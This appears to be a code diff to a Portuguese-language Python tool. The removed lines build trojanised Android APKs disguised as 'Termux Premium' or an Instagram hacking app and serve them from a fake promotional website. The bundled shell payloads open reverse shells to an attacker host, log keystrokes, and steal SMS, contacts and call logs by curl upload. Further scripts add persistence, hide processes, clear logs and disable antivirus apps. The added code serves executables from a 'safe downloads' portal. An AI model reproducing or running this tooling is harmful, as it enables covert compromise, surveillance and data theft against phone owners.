@@ -38,613 +38,312 @@ console = Console()
 TEMPLATES_DIR = "templates"
 APK_OUTPUT_DIR = "dist"
 WEB_ROOT = "web_content"
+UPLOADS_DIR = "uploads"
 
 # Garantir que os diretórios existam
 os.makedirs(TEMPLATES_DIR, exist_ok=True)
 os.makedirs(APK_OUTPUT_DIR, exist_ok=True)
 os.makedirs(WEB_ROOT, exist_ok=True)
+os.makedirs(UPLOADS_DIR, exist_ok=True)
 
-# ==================== GERADOR DE APK MALICIOSO REAL ====================
-class AdvancedAPKGenerator:
+# ==================== GERENCIADOR DE ARQUIVOS REAIS ====================
+class RealFileManager:
     def __init__(self):
-        self.templates = {
-            "termux": {
-                "name": "Termux Premium",
-                "package": "com.termux.premium",
-                "version": "1.0.0",
-                "description": "Terminal avançado para Android com recursos premium"
-            },
-            "instahacker": {
-                "name": "Instagram Hacker Pro", 
-                "package": "com.instahacker.pro",
-                "version": "2.5.1",
-                "description": "Ferramenta profissional para testes de segurança do Instagram"
+        self.supported_extensions = ['.apk', '.exe', '.py', '.sh', '.bat', '.deb', '.rpm']
+        self.uploaded_files = {}
+    
+    def validate_file(self, file_path):
+        """Valida se o arquivo existe e é suportado"""
+        if not os.path.exists(file_path):
+            return False, "Arquivo não encontrado"
+        
+        file_ext = os.path.splitext(file_path)[1].lower()
+        if file_ext not in self.supported_extensions:
+            return False, f"Extensão não suportada: {file_ext}"
+        
+        file_size = os.path.getsize(file_path)
+        if file_size > 100 * 1024 * 1024:  # 100MB limite
+            return False, "Arquivo muito grande (máximo 100MB)"
+        
+        return True, "Arquivo válido"
+    
+    def copy_file_to_server(self, file_path, custom_name=None):
+        """Copia o arquivo para o diretório de uploads do servidor"""
+        try:
+            # Validar arquivo
+            is_valid, message = self.validate_file(file_path)
+            if not is_valid:
+                return None, message
+            
+            # Gerar nome único para o arquivo
+            original_name = os.path.basename(file_path)
+            if custom_name:
+                file_name = custom_name + os.path.splitext(original_name)[1]
+            else:
+                file_name = original_name
+            
+            # Garantir nome único
+            counter = 1
+            base_name, ext = os.path.splitext(file_name)
+            while os.path.exists(os.path.join(UPLOADS_DIR, file_name)):
+                file_name = f"{base_name}_{counter}{ext}"
+                counter += 1
+            
+            destination = os.path.join(UPLOADS_DIR, file_name)
+            
+            # Copiar arquivo
+            shutil.copy2(file_path, destination)
+            
+            # Registrar arquivo
+            file_id = hashlib.md5(file_name.encode()).hexdigest()[:8]
+            self.uploaded_files[file_id] = {
+                'original_path': file_path,
+                'server_path': destination,
+                'file_name': file_name,
+                'file_size': os.path.getsize(destination),
+                'upload_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                'download_count': 0
             }
-        }
-        
-    def generate_advanced_apk(self, apk_type, lhost, lport, output_name=None):
-        """Gera um APK malicioso avançado com várias técnicas"""
-        if apk_type not in self.templates:
-            console.print(f"[red]❌ Tipo de APK não suportado: {apk_type}[/red]")
-            return None
-        
-        console.print(Panel.fit(
-            f"[bold]🚀 GERANDO APK {apk_type.upper()} AVANÇADO[/bold]",
-            border_style="yellow"
-        ))
-        
-        # Nome do arquivo de saída
-        apk_filename = output_name or f"{apk_type}_advanced_{int(time.time())}.apk"
-        apk_path = os.path.join(APK_OUTPUT_DIR, apk_filename)
-        
-        # Criar APK com múltiplas técnicas
-        if self.create_advanced_apk(apk_type, lhost, lport, apk_path):
-            console.print(Panel.fit(
-                f"[green]✅ APK AVANÇADO GERADO COM SUCESSO![/green]\n"
-                f"[cyan]Caminho: {apk_path}[/cyan]\n"
-                f"[cyan]Tipo: {apk_type}[/cyan]\n"
-                f"[cyan]LHOST: {lhost}[/cyan]\n"
-                f"[cyan]LPORT: {lport}[/cyan]\n"
-                f"[yellow]⚠️ Contém: Shell reverso + Keylogger + Data extraction[/yellow]",
-                title="[green]SUCESSO[/green]",
-                border_style="green"
-            ))
-            return apk_path
-        else:
-            console.print("[red]❌ Falha ao gerar o APK avançado.[/red]")
-            return None
-    
-    def create_advanced_apk(self, apk_type, lhost, lport, apk_path):
-        """Cria um APK avançado com múltiplas funcionalidades maliciosas"""
-        try:
-            # Criar diretório temporário
-            with tempfile.TemporaryDirectory() as temp_dir:
-                # Criar estrutura básica do APK
-                self.create_apk_structure(temp_dir, apk_type)
-                
-                # Adicionar payloads avançados
-                self.add_advanced_payloads(temp_dir, lhost, lport, apk_type)
-                
-                # Adicionar técnicas de persistência
-                self.add_persistence_mechanisms(temp_dir)
-                
-                # Adicionar técnicas de evasão
-                self.add_evasion_techniques(temp_dir)
-                
-                # Compilar o APK
-                self.compile_apk(temp_dir, apk_path)
-                
-                # Assinar o APK
-                self.sign_apk(apk_path)
-                
-                return True
-                
-        except Exception as e:
-            console.print(f"[red]❌ Erro ao criar APK avançado: {e}[/red]")
-            import traceback
-            traceback.print_exc()
-            return False
-    
-    def create_apk_structure(self, temp_dir, apk_type):
-        """Cria a estrutura básica de um APK Android"""
-        console.print("[yellow]⚠️ Criando estrutura do APK...[/yellow]")
-        
-        # Diretórios necessários
-        os.makedirs(os.path.join(temp_dir, "assets"), exist_ok=True)
-        os.makedirs(os.path.join(temp_dir, "res"), exist_ok=True)
-        os.makedirs(os.path.join(temp_dir, "META-INF"), exist_ok=True)
-        
-        # AndroidManifest.xml
-        manifest_content = f"""<?xml version="1.0" encoding="utf-8"?>
-<manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="{self.templates[apk_type]['package']}"
-    android:versionCode="1"
-    android:versionName="{self.templates[apk_type]['version']}">
-    
-    <uses-permission android:name="android.permission.INTERNET" />
-    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
-    <uses-permission android:name="android.permission.WAKE_LOCK" />
-    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
-    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
-    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
-    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
-    
-    <application
-        android:allowBackup="true"
-        android:icon="@drawable/ic_launcher"
-        android:label="{self.templates[apk_type]['name']}"
-        android:theme="@style/AppTheme">
-        
-        <activity
-            android:name=".MainActivity"
-            android:label="{self.templates[apk_type]['name']}">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity>
-        
-        <service android:name=".BackgroundService" />
-        <receiver android:name=".BootReceiver">
-            <intent-filter>
-                <action android:name="android.intent.action.BOOT_COMPLETED" />
-            </intent-filter>
-        </receiver>
-    </application>
-</manifest>"""
-        
-        with open(os.path.join(temp_dir, "AndroidManifest.xml"), "w") as f:
-            f.write(manifest_content)
-        
-        # Arquivo de recursos
-        with open(os.path.join(temp_dir, "resources.arsc"), "wb") as f:
-            f.write(b"resources")
-        
-        console.print("[green]✅ Estrutura do APK criada[/green]")
-    
-    def add_advanced_payloads(self, temp_dir, lhost, lport, apk_type):
-        """Adiciona payloads avançados ao APK"""
-        console.print("[yellow]⚠️ Adicionando payloads avançados...[/yellow]")
-        
-        assets_dir = os.path.join(temp_dir, "assets")
-        
-        # 1. Payload de Shell Reverso Multifuncional
-        reverse_shell = f"""#!/system/bin/sh
-# Advanced Reverse Shell with multiple connection methods
-LHOST="{lhost}"
-LPORT="{lport}"
-
-connect_back() {{
-    # Method 1: Netcat (traditional)
-    nc $LHOST $LPORT -e /system/bin/sh 2>/dev/null &
-    
-    # Method 2: BusyBox telnet (alternative)
-    busybox telnet $LHOST $LPORT 2>/dev/null | /system/bin/sh 2>/dev/null &
-    
-    # Method 3: /dev/tcp (bash style)
-    exec 5<>/dev/tcp/$LHOST/$LPORT
-    while read line 0<&5; do
-        eval "$line" 2>&5 >&5
-    done &
-}}
-
-# Main persistence loop
-while true; do
-    connect_back
-    sleep 30
-done
-"""
-        
-        with open(os.path.join(assets_dir, "reverse_shell.sh"), "w") as f:
-            f.write(reverse_shell)
-        
-        # 2. Keylogger Android
-        keylogger = f"""#!/system/bin/sh
-# Advanced Android Keylogger
-LOG_FILE="/sdcard/.system_log.txt"
-LHOST="{lhost}"
-LPORT="{lport + 1}"
-
-log_keys() {{
-    getevent -t /dev/input/event* | while read line; do
-        echo "$(date '+%Y-%m-%d %H:%M:%S') - $line" >> $LOG_FILE
-    done
-}}
-
-upload_logs() {{
-    while true; do
-        if [ -f $LOG_FILE ]; then
-            curl -F "file=@$LOG_FILE" http://$LHOST:$LPORT/upload 2>/dev/null
-            sleep 60
-        fi
-    done
-}}
-
-log_keys &
-upload_logs &
-"""
-        
-        with open(os.path.join(assets_dir, "keylogger.sh"), "w") as f:
-            f.write(keylogger)
-        
-        # 3. Data Extraction Script
-        data_extractor = f"""#!/system/bin/sh
-# Data Extraction Script
-LHOST="{lhost}"
-LPORT="{lport + 2}"
-
-extract_data() {{
-    # Extract SMS
-    content query --uri content://sms/ > /sdcard/sms_dump.txt
-    
-    # Extract contacts
-    content query --uri content://contacts/phones/ > /sdcard/contacts_dump.txt
-    
-    # Extract call log
-    content query --uri content://call_log/calls > /sdcard/calls_dump.txt
-    
-    # Compress and exfiltrate
-    tar -czf /sdcard/stolen_data.tar.gz /sdcard/*_dump.txt
-    curl -F "data=@/sdcard/stolen_data.tar.gz" http://$LHOST:$LPORT/exfiltrate 2>/dev/null
-    
-    # Cleanup
-    rm /sdcard/*_dump.txt /sdcard/stolen_data.tar.gz
-}}
-
-# Run extraction every 6 hours
-while true; do
-    extract_data
-    sleep 21600
-done
-"""
-        
-        with open(os.path.join(assets_dir, "data_extractor.sh"), "w") as f:
-            f.write(data_extractor)
-        
-        # 4. Main payload loader
-        main_loader = f"""#!/system/bin/sh
-# Main Payload Loader
-export PATH=$PATH:/system/bin
-
-# Start all payloads in background
-sh /data/data/{self.templates[apk_type]['package']}/files/reverse_shell.sh &
-sh /data/data/{self.templates[apk_type]['package']}/files/keylogger.sh &
-sh /data/data/{self.templates[apk_type]['package']}/files/data_extractor.sh &
-
-# Keep alive
-while true; do
-    sleep 3600
-done
-"""
-        
-        with open(os.path.join(assets_dir, "main_loader.sh"), "w") as f:
-            f.write(main_loader)
-        
-        # 5. Java code for Android app
-        java_code = f"""package {self.templates[apk_type]['package']};
-
-import android.app.*;
-import android.os.*;
-import android.content.*;
-import java.io.*;
-
-public class MainActivity extends Activity {{
-    @Override
-    protected void onCreate(Bundle savedInstanceState) {{
-        super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_main);
-        
-        // Start background service
-        startService(new Intent(this, BackgroundService.class));
-        
-        // Extract and execute payloads
-        new Thread(new Runnable() {{
-            public void run() {{
-                try {{
-                    extractAssets();
-                    executePayloads();
-                }} catch (Exception e) {{
-                    // Silent fail
-                }}
-            }}
-        }}).start();
-    }}
-    
-    private void extractAssets() {{
-        try {{
-            String[] payloads = {{"reverse_shell.sh", "keylogger.sh", "data_extractor.sh", "main_loader.sh"}};
-            for (String payload : payloads) {{
-                InputStream is = getAssets().open(payload);
-                FileOutputStream fos = openFileOutput(payload, Context.MODE_PRIVATE);
-                
-                byte[] buffer = new byte[1024];
-                int length;
-                while ((length = is.read(buffer)) > 0) {{
-                    fos.write(buffer, 0, length);
-                }}
-                
-                fos.close();
-                is.close();
-                
-                // Make executable
-                Process chmod = Runtime.getRuntime().exec("chmod 700 " + getFilesDir() + "/" + payload);
-                chmod.waitFor();
-            }}
-        }} catch (Exception e) {{
-            // Silent extraction
-        }}
-    }}
-    
-    private void executePayloads() {{
-        try {{
-            Runtime.getRuntime().exec("sh " + getFilesDir() + "/main_loader.sh");
-        }} catch (Exception e) {{
-            // Silent execution
-        }}
-    }}
-}}
-
-class BackgroundService extends Service {{
-    @Override
-    public IBinder onBind(Intent intent) {{ return null; }}
-    
-    @Override
-    public int onStartCommand(Intent intent, int flags, int startId) {{
-        // Service restart logic
-        return START_STICKY;
-    }}
-}}
-
-class BootReceiver extends BroadcastReceiver {{
-    @Override
-    public void onReceive(Context context, Intent intent) {{
-        // Restart service on boot
-        context.startService(new Intent(context, BackgroundService.class));
-    }}
-}}
-"""
-        
-        os.makedirs(os.path.join(temp_dir, "src", *self.templates[apk_type]['package'].split('.')), exist_ok=True)
-        java_dir = os.path.join(temp_dir, "src", *self.templates[apk_type]['package'].split('.'))
-        os.makedirs(java_dir, exist_ok=True)
-        
-        with open(os.path.join(java_dir, "MainActivity.java"), "w") as f:
-            f.write(java_code)
-        
-        console.print("[green]✅ Payloads avançados adicionados[/green]")
-    
-    def add_persistence_mechanisms(self, temp_dir):
-        """Adiciona mecanismos de persistência"""
-        console.print("[yellow]⚠️ Adicionando mecanismos de persistência...[/yellow]")
-        
-        # Script de persistência
-        persistence = """#!/system/bin/sh
-# Persistence Mechanisms
-
-# 1. Add to init scripts
-cp $0 /etc/init.d/malware_init
-chmod +x /etc/init.d/malware_init
-
-# 2. Add to cron (if available)
-echo "* * * * * sh $0" > /etc/cron.d/malware_cron
-
-# 3. Add to user startup
-echo "sh $0 &" >> /etc/profile
-
-# 4. Prevent removal
-chattr +i $0 2>/dev/null
-"""
-        
-        with open(os.path.join(temp_dir, "assets", "persistence.sh"), "w") as f:
-            f.write(persistence)
-        
-        console.print("[green]✅ Mecanismos de persistência adicionados[/green]")
-    
-    def add_evasion_techniques(self, temp_dir):
-        """Adiciona técnicas de evasão"""
-        console.print("[yellow]⚠️ Adicionando técnicas de evasão...[/yellow]")
-        
-        # Script de evasão
-        evasion = """#!/system/bin/sh
-# Evasion Techniques
-
-# 1. Hide processes
-mount -o remount,rw /system
-echo '#!/system/bin/sh' > /system/bin/hide_proc
-echo 'ps | grep -v malware | grep -v reverse_shell' >> /system/bin/hide_proc
-chmod +x /system/bin/hide_proc
-mount -o remount,ro /system
-
-# 2. Clean logs
-logcat -c 2>/dev/null
-
-# 3. Disable security tools
-pm disable com.antivirus.package 2>/dev/null
-pm disable com.security.app 2>/dev/null
-
-# 4. Fake network traffic
-ping -c 1 google.com >/dev/null 2>&1
-"""
-        
-        with open(os.path.join(temp_dir, "assets", "evasion.sh"), "w") as f:
-            f.write(evasion)
-        
-        console.print("[green]✅ Técnicas de evasão adicionadas[/green]")
-    
-    def compile_apk(self, temp_dir, apk_path):
-        """Compila o APK"""
-        console.print("[yellow]⚠️ Compilando APK...[/yellow]")
-        
-        try:
-            # Criar arquivo APK (simulação de compilação)
-            with zipfile.ZipFile(apk_path, 'w') as apk_zip:
-                for root, dirs, files in os.walk(temp_dir):
-                    for file in files:
-                        file_path = os.path.join(root, file)
-                        arcname = os.path.relpath(file_path, temp_dir)
-                        apk_zip.write(file_path, arcname)
             
-            console.print("[green]✅ APK compilado[/green]")
-            return True
+            return file_id, f"Arquivo copiado com sucesso: {file_name}"
             
         except Exception as e:
-            console.print(f"[red]❌ Erro ao compilar APK: {e}[/red]")
-            return False
+            return None, f"Erro ao copiar arquivo: {str(e)}"
     
-    def sign_apk(self, apk_path):
-        """Assina o APK (simulação)"""
-        console.print("[yellow]⚠️ Assinando APK...[/yellow]")
-        
+    def get_file_info(self, file_id):
+        """Obtém informações do arquivo"""
+        return self.uploaded_files.get(file_id)
+    
+    def increment_download_count(self, file_id):
+        """Incrementa contador de downloads"""
+        if file_id in self.uploaded_files:
+            self.uploaded_files[file_id]['download_count'] += 1
+    
+    def list_uploaded_files(self):
+        """Lista todos os arquivos carregados"""
+        return self.uploaded_files
+    
+    def delete_file(self, file_id):
+        """Remove arquivo do servidor"""
         try:
-            # Simular assinatura (em produção real, usaria jarsigner)
-            with open(apk_path, 'ab') as f:
-                f.write(b"\n<!-- APK signed -->\n")
-            
-            console.print("[green]✅ APK assinado[/green]")
-            return True
-            
+            if file_id in self.uploaded_files:
+                file_info = self.uploaded_files[file_id]
+                os.remove(file_info['server_path'])
+                del self.uploaded_files[file_id]
+                return True, "Arquivo removido com sucesso"
+            else:
+                return False, "Arquivo não encontrado"
         except Exception as e:
-            console.print(f"[red]❌ Erro ao assinar APK: {e}[/red]")
-            return False
+            return False, f"Erro ao remover arquivo: {str(e)}"
 
-# ==================== SERVIDOR WEB FAKE AVANÇADO ====================
-class AdvancedFakeSiteHandler(BaseHTTPRequestHandler):
+# ==================== SERVIDOR WEB PARA DISTRIBUIÇÃO REAL ====================
+class RealFileServerHandler(BaseHTTPRequestHandler):
     def __init__(self, *args, **kwargs):
-        self.apk_type = kwargs.pop('apk_type', 'termux')
-        self.apk_path = kwargs.pop('apk_path', None)
-        self.apk_name = kwargs.pop('apk_name', 'Aplicativo Premium')
+        self.file_manager = kwargs.pop('file_manager', None)
+        self.site_config = kwargs.pop('site_config', {})
         super().__init__(*args, **kwargs)
     
-    def do_GET(self):
+    def log_message(self, format, *args):
+        """Customiza logging do servidor"""
         client_ip = self.client_address[0]
-        console.print(f"[yellow]📥 GET de {client_ip}: {self.path}[/yellow]")
+        console.print(f"[cyan]🌐 {client_ip} - {format % args}[/cyan]")
+    
+    def do_GET(self):
+        """Manipula requisições GET"""
+        client_ip = self.client_address[0]
         
-        # Servir páginas diferentes
         if self.path == '/':
             self.serve_main_page()
-        elif self.path == '/download':
-            self.serve_download_page()
-        elif self.path == '/features':
-            self.serve_features_page()
-        elif self.path == '/faq':
-            self.serve_faq_page()
-        elif self.path == '/download-apk' and self.apk_path:
-            self.serve_apk_download()
-        elif self.path.startswith('/static/'):
-            self.serve_static_file()
+        elif self.path == '/downloads':
+            self.serve_downloads_page()
+        elif self.path.startswith('/download/'):
+            self.serve_file_download()
+        elif self.path == '/about':
+            self.serve_about_page()
+        elif self.path == '/stats':
+            self.serve_stats_page()
         else:
             self.serve_404()
     
     def serve_main_page(self):
+        """Serve página principal"""
         self.send_response(200)
-        self.send_header('Content-type', 'text/html')
+        self.send_header('Content-type', 'text/html; charset=utf-8')
         self.end_headers()
         
-        html_content = self.generate_advanced_site()
-        self.wfile.write(html_content.encode())
+        html_content = self.generate_main_page()
+        self.wfile.write(html_content.encode('utf-8'))
     
-    def serve_download_page(self):
+    def serve_downloads_page(self):
+        """Serve página de downloads"""
         self.send_response(200)
-        self.send_header('Content-type', 'text/html')
+        self.send_header('Content-type', 'text/html; charset=utf-8')
         self.end_headers()
         
-        html_content = self.generate_download_page()
-        self.wfile.write(html_content.encode())
+        html_content = self.generate_downloads_page()
+        self.wfile.write(html_content.encode('utf-8'))
     
-    def serve_features_page(self):
-        self.send_response(200)
-        self.send_header('Content-type', 'text/html')
-        self.end_headers()
-        
-        html_content = self.generate_features_page()
-        self.wfile.write(html_content.encode())
-    
-    def serve_faq_page(self):
-        self.send_response(200)
-        self.send_header('Content-type', 'text/html')
-        self.end_headers()
-        
-        html_content = self.generate_faq_page()
-        self.wfile.write(html_content.encode())
-    
-    def serve_apk_download(self):
-        if not self.apk_path or not os.path.exists(self.apk_path):
-            self.send_response(404)
-            self.end_headers()
-            self.wfile.write(b'APK not found')
-            return
-        
-        self.send_response(200)
-        self.send_header('Content-Type', 'application/vnd.android.package-archive')
-        self.send_header('Content-Disposition', f'attachment; filename="{os.path.basename(self.apk_path)}"')
-        self.end_headers()
-        
+    def serve_file_download(self):
+        """Serve download de arquivo real"""
         try:
-            with open(self.apk_path, 'rb') as f:
-                self.wfile.write(f.read())
-            console.print(f"[green]✅ APK enviado para cliente[/green]")
-        except Exception as e:
-            console.print(f"[red]❌ Erro ao enviar APK: {e}[/red]")
-    
-    def serve_static_file(self):
-        # Servir arquivos estáticos (CSS, JS, imagens)
-        file_path = self.path[1:]  # Remove a barra inicial
-        
-        if os.path.exists(file_path) and ".." not in file_path:
-            self.send_response(200)
+            # Extrair file_id da URL
+            file_id = self.path.split('/')[-1]
+            
+            file_info = self.file_manager.get_file_info(file_id)
+            if not file_info:
+                self.serve_404()
+                return
+            
+            file_path = file_info['server_path']
+            file_name = file_info['file_name']
+            
+            if not os.path.exists(file_path):
+                self.serve_404()
+                return
+            
+            # Incrementar contador de downloads
+            self.file_manager.increment_download_count(file_id)
             
             # Determinar tipo MIME
-            if file_path.endswith('.css'):
-                self.send_header('Content-type', 'text/css')
-            elif file_path.endswith('.js'):
-                self.send_header('Content-type', 'application/javascript')
-            elif file_path.endswith('.png'):
-                self.send_header('Content-type', 'image/png')
-            elif file_path.endswith('.jpg') or file_path.endswith('.jpeg'):
-                self.send_header('Content-type', 'image/jpeg')
-            else:
-                self.send_header('Content-type', 'application/octet-stream')
+            ext = os.path.splitext(file_name)[1].lower()
+            mime_types = {
+                '.apk': 'application/vnd.android.package-archive',
+                '.exe': 'application/x-msdownload',
+                '.py': 'text/x-python',
+                '.sh': 'application/x-shellscript',
+                '.bat': 'application/x-msdownload',
+                '.deb': 'application/x-debian-package',
+                '.rpm': 'application/x-rpm'
+            }
             
+            content_type = mime_types.get(ext, 'application/octet-stream')
+            
+            # Enviar arquivo
+            self.send_response(200)
+            self.send_header('Content-Type', content_type)
+            self.send_header('Content-Disposition', f'attachment; filename="{file_name}"')
+            self.send_header('Content-Length', str(os.path.getsize(file_path)))
             self.end_headers()
             
             with open(file_path, 'rb') as f:
-                self.wfile.write(f.read())
-        else:
-            self.serve_404()
+                shutil.copyfileobj(f, self.wfile)
+            
+            console.print(f"[green]✅ Download realizado: {file_name} por {self.client_address[0]}[/green]")
+            
+        except Exception as e:
+            console.print(f"[red]❌ Erro no download: {str(e)}[/red]")
+            self.serve_500()
+    
+    def serve_about_page(self):
+        """Serve página sobre"""
+        self.send_response(200)
+        self.send_header('Content-type', 'text/html; charset=utf-8')
+        self.end_headers()
+        
+        html_content = self.generate_about_page()
+        self.wfile.write(html_content.encode('utf-8'))
+    
+    def serve_stats_page(self):
+        """Serve página de estatísticas"""
+        self.send_response(200)
+        self.send_header('Content-type', 'text/html; charset=utf-8')
+        self.end_headers()
+        
+        html_content = self.generate_stats_page()
+        self.wfile.write(html_content.encode('utf-8'))
     
     def serve_404(self):
+        """Serve página 404"""
         self.send_response(404)
-        self.send_header('Content-type', 'text/html')
+        self.send_header('Content-type', 'text/html; charset=utf-8')
         self.end_headers()
-        self.wfile.write(b'<h1>404 - Pagina nao encontrada</h1>')
+        
+        html_content = """
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>404 - Não Encontrado</title>
+            <style>
+                body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
+                h1 { color: #d32f2f; }
+            </style>
+        </head>
+        <body>
+            <h1>404 - Página Não Encontrada</h1>
+            <p>A página que você está procurando não existe.</p>
+            <a href="/">Voltar à Página Principal</a>
+        </body>
+        </html>
+        """
+        self.wfile.write(html_content.encode('utf-8'))
     
-    def generate_advanced_site(self):
-        """Gera HTML avançado para o site fake"""
-        if self.apk_type == 'termux':
-            return self.generate_termux_site()
-        else:
-            return self.generate_instahacker_site()
+    def serve_500(self):
+        """Serve erro 500"""
+        self.send_response(500)
+        self.send_header('Content-type', 'text/html; charset=utf-8')
+        self.end_headers()
+        
+        html_content = """
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>500 - Erro Interno</title>
+            <style>
+                body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
+                h1 { color: #d32f2f; }
+            </style>
+        </head>
+        <body>
+            <h1>500 - Erro Interno do Servidor</h1>
+            <p>Ocorreu um erro interno no servidor.</p>
+            <a href="/">Voltar à Página Principal</a>
+        </body>
+        </html>
+        """
+        self.wfile.write(html_content.encode('utf-8'))
     
-    def generate_termux_site(self):
-        """Gera site fake avançado para Termux"""
-        return """
+    def generate_main_page(self):
+        """Gera página principal do site"""
+        site_title = self.site_config.get('title', 'Portal de Downloads')
+        site_description = self.site_config.get('description', 'Downloads seguros e confiáveis')
+        
+        return f"""
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Termux Premium - Terminal Avançado para Android</title>
+    <title>{site_title}</title>
     <style>
-        :root {
-            --primary: #00bcd4;
-            --secondary: #0097a7;
-            --accent: #ff4081;
+        :root {{
+            --primary: #2196F3;
+            --secondary: #1976D2;
+            --accent: #FF4081;
             --dark: #263238;
-            --light: #eceff1;
-        }
+            --light: #ECEFF1;
+        }}
         
-        * {
+        * {{
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-        }
+        }}
         
-        body {
+        body {{
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             line-height: 1.6;
             color: #333;
-            background: linear-gradient(135deg, #0d47a1 0%, #1976d2 100%);
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
-        }
+        }}
         
-        .container {
+        .container {{
             max-width: 1200px;
             margin: 0 auto;
             padding: 0 20px;
-        }
+        }}
         
-        /* Header */
-        header {
+        header {{
             background: rgba(255, 255, 255, 0.1);
             backdrop-filter: blur(10px);
             padding: 20px 0;
@@ -652,70 +351,62 @@ class AdvancedFakeSiteHandler(BaseHTTPRequestHandler):
             width: 100%;
             top: 0;
             z-index: 1000;
-        }
+        }}
         
-        nav {
+        nav {{
             display: flex;
             justify-content: space-between;
             align-items: center;
-        }
+        }}
         
-        .logo {
+        .logo {{
             font-size: 28px;
             font-weight: bold;
             color: white;
             display: flex;
             align-items: center;
-        }
+        }}
         
-        .logo span {
-            margin-right: 10px;
-            font-size: 32px;
-        }
-        
-        .nav-links {
+        .nav-links {{
             display: flex;
             list-style: none;
-        }
+        }}
         
-        .nav-links li {
+        .nav-links li {{
             margin-left: 30px;
-        }
+        }}
         
-        .nav-links a {
+        .nav-links a {{
             color: white;
             text-decoration: none;
             font-weight: 500;
             transition: color 0.3s;
-        }
+        }}
         
-        .nav-links a:hover {
+        .nav-links a:hover {{
             color: var(--accent);
-        }
+        }}
         
-        /* Hero Section */
-        .hero {
+        .hero {{
             padding: 160px 0 80px;
             text-align: center;
             color: white;
-        }
+        }}
         
-        .hero h1 {
+        .hero h1 {{
             font-size: 48px;
             margin-bottom: 20px;
-            animation: fadeInUp 1s ease;
-        }
+        }}
         
-        .hero p {
+        .hero p {{
             font-size: 20px;
             margin-bottom: 40px;
             max-width: 600px;
             margin-left: auto;
             margin-right: auto;
-            animation: fadeInUp 1s ease 0.2s both;
-        }
+        }}
         
-        .btn {
+        .btn {{
             display: inline-block;
             background: var(--accent);
             color: white;
@@ -724,93 +415,68 @@ class AdvancedFakeSiteHandler(BaseHTTPRequestHandler):
             text-decoration: none;
             font-weight: bold;
             transition: transform 0.3s, box-shadow 0.3s;
-            animation: fadeInUp 1s ease 0.4s both;
-        }
+        }}
         
-        .btn:hover {
+        .btn:hover {{
             transform: translateY(-3px);
             box-shadow: 0 10px 20px rgba(0,0,0,0.2);
-        }
+        }}
         
-        /* Features */
-        .features {
+        .features {{
             padding: 80px 0;
             background: white;
-        }
+        }}
         
-        .section-title {
+        .section-title {{
             text-align: center;
             margin-bottom: 60px;
-        }
+        }}
         
-        .section-title h2 {
+        .section-title h2 {{
             font-size: 36px;
             color: var(--dark);
             margin-bottom: 20px;
-        }
+        }}
         
-        .features-grid {
+        .features-grid {{
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
             gap: 40px;
-        }
+        }}
         
-        .feature-card {
+        .feature-card {{
             background: #f8f9fa;
             padding: 30px;
             border-radius: 15px;
             text-align: center;
             transition: transform 0.3s;
-        }
+        }}
         
-        .feature-card:hover {
+        .feature-card:hover {{
             transform: translateY(-10px);
-        }
+        }}
         
-        .feature-icon {
+        .feature-icon {{
             font-size: 48px;
             margin-bottom: 20px;
-            color: var(--primary);
-        }
+        }}
         
-        /* Download Section */
-        .download {
-            padding: 80px 0;
-            background: linear-gradient(135deg, #00bcd4 0%, #0097a7 100%);
-            color: white;
-            text-align: center;
-        }
-        
-        /* Footer */
-        footer {
+        footer {{
             background: var(--dark);
             color: white;
             padding: 40px 0;
             text-align: center;
-        }
+        }}
         
-        /* Animations */
-        @keyframes fadeInUp {
-            from {
-                opacity: 0;
-                transform: translateY(30px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-        
-        /* Responsive */
-        @media (max-width: 768px) {
-            .nav-links {
+        @media (max-width: 768px) {{
+            .nav-links {{
                 display: none;
-            }
+            }}
             
-            .hero h1 {
+            .hero h1 {{
                 font-size: 36px;
-            }
-        }
+            }}
+        }}
     </style>
 </head>
 <body>
@@ -818,13 +484,14 @@ class AdvancedFakeSiteHandler(BaseHTTPRequestHandler):
         <div class="container">
             <nav>
                 <div class="logo">
-                    <span>🖥️</span>
-                    Termux Premium
+                    <span>📥</span>
+                    {site_title}
                 </div>
                 <ul class="nav-links">
-                    <li><a href="#features">Recursos</a></li>
-                    <li><a href="/download">Download</a></li>
-                    <li><a href="/faq">FAQ</a></li>
+                    <li><a href="/">Início</a></li>
+                    <li><a href="/downloads">Downloads</a></li>
+                    <li><a href="/about">Sobre</a></li>
+                    <li><a href="/stats">Estatísticas</a></li>
                 </ul>
             </nav>
         </div>
@@ -832,344 +499,394 @@ class AdvancedFakeSiteHandler(BaseHTTPRequestHandler):
 
     <section class="hero">
         <div class="container">
-            <h1>Termux Premium</h1>
-            <p>O terminal mais avançado para Android, com recursos exclusivos e performance incomparável.</p>
-            <a href="/download" class="btn">Download Gratuito</a>
+            <h1>{site_title}</h1>
+            <p>{site_description}</p>
+            <a href="/downloads" class="btn">Ver Downloads Disponíveis</a>
         </div>
     </section>
 
-    <section id="features" class="features">
+    <section class="features">
         <div class="container">
             <div class="section-title">
-                <h2>Recursos Exclusivos</h2>
-                <p>Descubra por que o Termux Premium é a melhor escolha</p>
+                <h2>Por que Escolher Nosso Portal?</h2>
+                <p>Segurança, confiabilidade e velocidade</p>
             </div>
             
             <div class="features-grid">
                 <div class="feature-card">
-                    <div class="feature-icon">⚡</div>
-                    <h3>Performance Otimizada</h3>
